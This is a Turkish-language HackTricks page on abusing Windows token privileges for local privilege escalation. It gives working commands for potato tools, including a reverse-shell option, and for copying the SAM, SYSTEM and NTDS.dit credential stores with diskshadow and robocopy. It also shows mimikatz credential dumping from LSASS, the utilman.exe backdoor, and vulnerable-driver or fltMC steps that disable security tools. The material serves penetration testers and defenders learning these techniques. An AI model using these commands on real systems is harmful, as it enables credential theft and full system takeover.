# Tokens'ı Kötüye Kullanma

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens**'ın ne olduğunu bilmiyorsanız devam etmeden önce bu sayfayı okuyun:


{{#ref}}
access-tokens.md
{{#endref}}

**Elinizde bulunan tokens'ı kötüye kullanarak ayrıcalıklarınızı yükseltebilirsiniz.**

### SeImpersonatePrivilege

Bu ayrıcalık, bir sürecin bir token'a erişim tanıtıcısı alabildiğinde o token'ı taklit etmesine (ancak oluşturamamasına) olanak tanır. Ayrıcalıklı bir token, bir Windows hizmetinin (DCOM) bir exploit'e karşı NTLM kimlik doğrulaması yapması sağlanarak elde edilebilir; böylece SYSTEM ayrıcalıklarıyla bir süreç çalıştırılabilir.<sup>[[2]](#references)</sup> Bu primitive, [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (WinRM'nin devre dışı olmasını gerektirir), [SweetPotato](https://github.com/CCob/SweetPotato) ve [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) gibi araçlarla istismar edilebilir.

Yerel bir kullanıcı, daha ayrıcalıklı bir kimlikle çağıranın seçtiği URL'ye istek gönderen kimliği doğrulanmış bir endpoint'e erişebiliyorsa, yalnızca loopback üzerinde çalışan bir web uygulaması ayrı bir coercion fırsatı olabilir. Endpoint'in yetkilendirme ve URL kısıtlamalarını, giden isteği yapan istemcinin gerçek kimliğini ve kimlik doğrulama davranışını ve bu istemcinin düşük ayrıcalıklı kullanıcının kontrolündeki bir listener'a erişip erişemediğini inceleyin. `SeImpersonatePrivilege`'in etkin olması, bir IIS listener'ı veya URL-fetch parametresi tek başına ayrıcalıklı bir token ya da ayrıcalık yükseltme yolu olduğunu kanıtlamaz. Bu incelemeyi pasif tutun; keşif sırasında coercion istekleri göndermeyin. Microsoft'un [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) ve [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgelerine bakın.

Modern operatör notları:

- **JuicyPotato artık eski bir araçtır**: Windows 10 1809+/Server 2019+ sistemlerde, hangi RPC/COM yüzeyine hâlâ erişilebildiğine bağlı olarak **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** veya **PrintSpoofer** kullanmayı tercih edin.
- **`LOCAL SERVICE`** veya **`NETWORK SERVICE`** olarak çalışan bir hizmeti ele geçirdiyseniz ve `whoami /priv` çıktısında `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` bulunmayan **filtered token** görünüyorsa, potato ailesini yeniden denemeden önce hesabın **varsayılan ayrıcalık kümesini** geri kazanın (örneğin **FullPowers** ile).<sup>[[3]](#references)</sup>
- Bazı yeni fork'lar, operatörler için orijinal araçlardan daha kullanışlıdır. Örneğin **SigmaPotato**, reflection/bellek içi çalıştırma ve modern Windows uyumluluğu eklerken **PrintNotifyPotato**, PrintNotify COM hizmetini kötüye kullanır ve klasik Spooler yolu devre dışı bırakıldığında genellikle işe yarar.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**'e çok benzer; ayrıcalıklı bir token almak için **aynı yöntemi** kullanır.\
Ardından bu ayrıcalık, yeni/askıya alınmış bir sürece **bir primary token atamaya** olanak tanır. Ayrıcalıklı impersonation token ile bir primary token türetebilirsiniz (DuplicateTokenEx).\
Bu token ile 'CreateProcessAsUser' kullanarak **yeni bir süreç** oluşturabilir veya askıya alınmış bir süreç oluşturup **token'ı ayarlayabilirsiniz** (genel olarak, çalışan bir sürecin primary token'ını değiştiremezsiniz).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Bu token'ı etkinleştirdiyseniz, kimlik bilgilerini bilmeden başka herhangi bir kullanıcı için bir **impersonation token** almak üzere **KERB_S4U_LOGON** kullanabilir, token'a **rastgele bir grup** (admins) ekleyebilir, token'ın **integrity level** değerini "**medium**" olarak ayarlayabilir ve bu token'ı **geçerli thread'e** atayabilirsiniz (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Bu ayrıcalık, sistemin herhangi bir dosyaya tüm okuma erişimini (yalnızca okuma işlemleriyle sınırlı) **vermesini sağlar**. Kayıt defterinden yerel Administrator hesaplarının **parola hash'lerini okumak** için kullanılır; ardından hash ile "**psexec**" veya "**wmiexec**" gibi araçlar kullanılabilir (Pass-the-Hash tekniği). Ancak bu teknik iki durumda başarısız olur: Local Administrator hesabı devre dışı bırakıldığında veya uzaktan bağlanan Local Administrator kullanıcılarının yönetici haklarını kaldıran bir ilke uygulandığında.<sup>[[2]](#references)</sup>\
Uygulamada, en güvenilir yerleşik iş akışı genellikle **VSS + `robocopy /b`** kullanmaktır: bir shadow copy oluşturup kullanıma açın, ardından `SAM`/`SYSTEM` veya `NTDS.dit` dosyalarını dosya ACL'lerini atlayan **backup mode** ile kopyalayın.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Bu **yetkiyi kötüye kullanabilirsiniz**:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)'i takip ederek
- Ya da şu bölümde açıklandığı şekilde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Bu yetki, dosyanın Access Control List (ACL) ayarlarından bağımsız olarak tüm sistem dosyalarına **yazma erişimi** sağlar. **Servisleri değiştirme**, DLL Hijacking gerçekleştirme ve diğer tekniklerin yanı sıra Image File Execution Options üzerinden **debugger** ayarlama gibi birçok privilege escalation olanağının önünü açar.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege, özellikle bir kullanıcı token'ları taklit etme yeteneğine sahipse güçlü bir yetkidir; ancak SeImpersonatePrivilege olmadığında da işe yarar. Bu yetenek, aynı kullanıcıyı temsil eden ve bütünlük düzeyi geçerli sürecinkini aşmayan bir token'ı taklit edebilme koşuluna bağlıdır.<sup>[[2]](#references)</sup>

**Önemli Noktalar:**

- **SeImpersonatePrivilege Olmadan Impersonation:** Belirli koşullar altında token'ları taklit ederek EoP için SeCreateTokenPrivilege'den yararlanmak mümkündür.
- **Token Impersonation Koşulları:** Başarılı impersonation için hedef token aynı kullanıcıya ait olmalı ve bütünlük düzeyi, impersonation yapmaya çalışan sürecin bütünlük düzeyine eşit veya ondan düşük olmalıdır.
- **Impersonation Token'larının Oluşturulması ve Değiştirilmesi:** Kullanıcılar bir impersonation token'ı oluşturabilir ve ayrıcalıklı bir grubun SID'sini (Security Identifier) ekleyerek token'ı güçlendirebilir.

### SeLoadDriverPrivilege

Bu yetki, belirli `ImagePath` ve `Type` değerlerini içeren bir registry kaydı oluşturarak bir sürecin **aygıt sürücülerini yükleyip kaldırmasına** olanak tanır. `HKLM`'ye (HKEY_LOCAL_MACHINE) doğrudan yazma erişimi kısıtlandığından bunun yerine `HKCU` (HKEY_CURRENT_USER) kullanılabilir. Ancak `HKCU` girdisinin kernel tarafından sürücü yapılandırması olarak tanınması için belirli bir yol gerekir.<sup>[[2]](#references)</sup>

Günümüzde bu yetkinin saldırı amaçlı kullanımı genellikle **BYOVD**'dir (kendi güvenlik açığı bulunan sürücünü getir): **imzalı ancak güvenlik açığı bulunan** bir kernel sürücüsü yükleyip korumaları devre dışı bırakmak veya kernel kodu çalıştırmaya geçmek için sürücünün IOCTL'lerini kullanın. Güncel Windows 11/Server sürümlerinde **Microsoft'un güvenlik açığı bulunan sürücü engelleme listesi** ve/veya **HVCI/Memory Integrity** eski, herkese açık exploit zincirlerinin çoğunu devre dışı bırakabilir. Bu nedenle klasik `szkg64.sys` benzeri örnekler artık her ortamda güvenilir değildir.

Bu yol `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` şeklindedir. Burada `<RID>`, geçerli kullanıcının Relative Identifier değeridir. `HKCU` altında bu yolun tamamı oluşturulmalı ve iki değer ayarlanmalıdır:<sup>[[2]](#references)</sup>

- `ImagePath`: çalıştırılacak binary'nin yolu
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) değeri.

**İzlenecek Adımlar:**

1. Yazma erişimi kısıtlı olduğundan `HKLM` yerine `HKCU`'ya erişin.
2. `<RID>` geçerli kullanıcının Relative Identifier değerini temsil edecek şekilde, `HKCU` altında `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` yolunu oluşturun.
3. `ImagePath` değerini binary'nin çalıştırılacağı yol olarak ayarlayın.
4. `Type` değerini `SERVICE_KERNEL_DRIVER` (`0x00000001`) olarak ayarlayın.

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Bu yetkiyi kötüye kullanmanın diğer yolları: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Bu, **SeRestorePrivilege** yetkisine benzer. Temel işlevi, bir sürecin **bir nesnenin sahipliğini üstlenmesine** izin vererek WRITE_OWNER erişim hakları aracılığıyla açık ve ihtiyari erişim sağlama gerekliliğini atlamaktır. Süreç, önce yazma amacıyla hedeflenen kayıt defteri anahtarının sahipliğini güvence altına almayı, ardından yazma işlemlerine izin vermek için DACL'yi değiştirmeyi içerir.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Bu ayrıcalık, bellek okuma ve yazma dahil olmak üzere **diğer süreçlerde hata ayıklamaya** olanak tanır. Bu ayrıcalıkla, çoğu antivirüs ve ana bilgisayar saldırı önleme çözümünü atlatabilen çeşitli bellek enjeksiyonu stratejileri kullanılabilir.<sup>[[2]](#references)</sup>

Modern Windows'ta `SeDebugPrivilege`'in **korumalı olmayan SYSTEM süreçlerini** açmak ve token'larını çoğaltmak için genellikle yeterli olduğunu, ancak **LSASS**'e erişebileceğinizi garanti etmediğini unutmayın. **RunAsPPL / LSA Protection** etkinse, `SeDebugPrivilege` mevcut olsa bile korumasız süreçler LSASS'i okuyamaz veya içine kod enjekte edemez. Bu durumda, başka bir PPL olmayan SYSTEM sürecinden token çalın ya da `procdump`'ın çalışacağını varsaymak yerine PPL bypass/BYOVD ile zincir kurun. `SeDebugPrivilege` + `SeImpersonatePrivilege` kullanarak token kopyalamaya ilişkin tam bir örnek için [bu sayfaya](sedebug-+-seimpersonate-copy-token.md) bakın.

#### Belleği dökme

Bir sürecin **belleğini yakalamak** için [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) içindeki [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aracını kullanabilirsiniz. Bu yöntem özellikle, kullanıcı sisteme başarıyla giriş yaptıktan sonra kullanıcı kimlik bilgilerini depolamaktan sorumlu olan **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** süreci için kullanılabilir.

Parolaları elde etmek için bu dökümü daha sonra mimikatz'e yükleyebilirsiniz:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Daha önce kaydedilmiş, okunabilir bir LSASS dökümü, hesabın canlı korumalı süreci yakalama izni olmasa bile mevcut olabilir. Bir döküm dosyasını veya benzer adlı bir arşivi yalnızca ipucu olarak değerlendirin: erişimi ve içeriği doğrulayın, ardından kurtarılan kimlik bilgilerinin hâlâ geçerli olup olmadığını ve daha yüksek ayrıcalıklı bir bağlam sağladığını değerlendirin. Dosya adları tek başına bir arşivin döküm içerdiğini veya kimlik bilgilerinin yeniden kullanılabilir olduğunu kanıtlamaz.

#### RCE

`NT SYSTEM` shell almak istiyorsanız şunları kullanabilirsiniz:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Bu hak (Birim bakım görevlerini gerçekleştirme), ayrıcalıklı birim işlemlerini destekleyebilir; ancak tek başına okunabilir bir ham birim tanıtıcısını veya rastgele dosyalara erişimi garanti etmez. Aygıt ACL'leri, token durumu, Windows sürümü ve istenen işlem de önemlidir. İzin verilen birim denetimi işlemi bunun yerine dosya sistemi ACL'lerini değiştirebilir; bu, değişiklik yapan ve potansiyel olarak birimin tamamını etkileyen bir işlemdir. CA sunucusunda sertifika kötüye kullanımı için kullanılabilir özel anahtar materyaline erişim de gerekir; EFS ile korunan dosyalara erişmek içinse yetkili bir şifre çözme veya kurtarma anahtarı gerekir. Ayrıntılı önkoşullar aşağıda açıklanmıştır.<sup>[[5]](#references)</sup>

Ayrıntılı tekniklere ve azaltma önlemlerine bakın:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Ayrıcalıkları denetleme

```
whoami /priv
```

**Disabled** olarak görünen token'lar genellikle etkinleştirilebilir; bu nedenle çoğu zaman hem _Enabled_ hem de _Disabled_ ayrıcalıklarını kötüye kullanabilirsiniz.

### Tüm token'ları etkinleştirme

Devre dışı ayrıcalıklarınız varsa, tüm token'ları etkinleştirmek için [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script'ini kullanabilirsiniz:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ya da bu [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) içine gömülü **script**.

## Table

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) adresinde tüm token privileges için kapsamlı bir cheatsheet bulunuyor. Aşağıdaki özet, yalnızca bu privilege'ı kullanarak admin session elde etmenin veya hassas dosyaları okumanın doğrudan yollarını listeler.<sup>[[1]](#references)</sup>

| Privilege                  | Etki        | Araç                    | Yürütme yolu                                                                                                                                                                                                                                                                                                                                     | Notlar                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Bir kullanıcının token'ları taklit etmesine ve potato.exe, rottenpotato.exe ve juicypotato.exe gibi araçları kullanarak nt system'e privesc yapmasına olanak tanır."_                                                                                                                                                                              | Güncelleme için [Aurélien Chalot](https://twitter.com/Defte_)'ya teşekkürler. Yakında bunu daha çok adım adım tarif biçiminde yeniden ifade etmeye çalışacağım.                                                                                                                                                                  |
| **`SeBackup`**             | **Tehdit**  | _**Yerleşik komutlar**_ | `robocopy /b` veya SeBackup-aware özel kopyalama yardımcılarıyla hassas dosyaları okuyun.                                                                                                                                                                                                                                                        | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` ve bazen `%WINDIR%\MEMORY.DMP` için kullanışlıdır.<br><br>- `robocopy` kullanışlıdır ancak SeBackup cmdlet'leri/API'leri, kilitli veya açık dosyalar için genellikle daha esnektir.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` ile yerel admin haklarını içeren, istenen özelliklerde bir token oluşturun.                                                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **PPL olmayan** bir SYSTEM token'ını çoğaltın veya korumasız bir process'ten belleği dump edin.                                                                                                                                                                                                                                                     | <p>RunAsPPL/LSA Protection etkinse LSASS dump işlemi genellikle engellenir.</p><p>Script, [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) adresinde bulunabilir.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | SYSTEM olarak process başlatmak için **Potato family** / named-pipe impersonation kullanın (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` vb.).                                                                                                                                                                   | <p>IIS APPPOOL, MSSQL, scheduled tasks gibi service account'larda veya `SeImpersonatePrivilege`'a zaten sahip olan herhangi bir bağlamda en kullanışlıdır.</p>                                                                                                                                                                   |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. İmzalı ancak savunmasız bir kernel driver yükleyin (BYOVD)<br>2. Kernel R/W elde etmek, güvenlik araçlarını devre dışı bırakmak veya SYSTEM yetkisine yükseltmek için driver'ın IOCTL'lerini kullanın<br><br>Alternatif olarak bu privilege, güvenlikle ilgili driver'ları yerleşik <code>fltMC</code> komutuyla kaldırmak için kullanılabilir; örneğin <code>fltMC sysmondrv</code></p> | <p><code>szkg64.sys</code> gibi eski public driver'lar, savunmasız driver blocklist'i / HVCI nedeniyle modern Windows'ta giderek daha fazla engelleniyor.</p>                                                                                                                                                                    |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege mevcutken PowerShell/ISE başlatın.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> ile privilege'ı etkinleştirin.<br>3. utilman.exe dosyasını utilman.old olarak yeniden adlandırın<br>4. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>5. Konsolu kilitleyin ve Win+U tuşlarına basın</p> | <p>Bu saldırı bazı AV yazılımları tarafından tespit edilebilir.</p><p>Alternatif yöntem, aynı privilege'ı kullanarak "Program Files" içinde bulunan service binary'lerini değiştirmeye dayanır.</p>                                                                                                                                 |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Yerleşik komutlar**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>4. Konsolu kilitleyin ve Win+U tuşlarına basın</p>                                                                                                  | <p>Bu saldırı bazı AV yazılımları tarafından tespit edilebilir.</p><p>Alternatif yöntem, aynı privilege'ı kullanarak "Program Files" içinde bulunan service binary'lerini değiştirmeye dayanır.</p>                                                                                                                                 |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Yerel admin haklarını içerecek şekilde token'ları değiştirin. SeImpersonate gerekebilir.</p><p>Doğrulanması gerekiyor.</p>                                                                                                                                                                                                                       |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege'larından admin'e giden exploitation yolları](https://github.com/gtworek/Priv2Admin)
- [2] [LPE için Token Privileges'ı Kötüye Kullanma](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privilege'larımı Geri Verin! Lütfen?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode, file/folder ACL kontrollerini atlar)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Birim bakım görevlerini gerçekleştirme (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
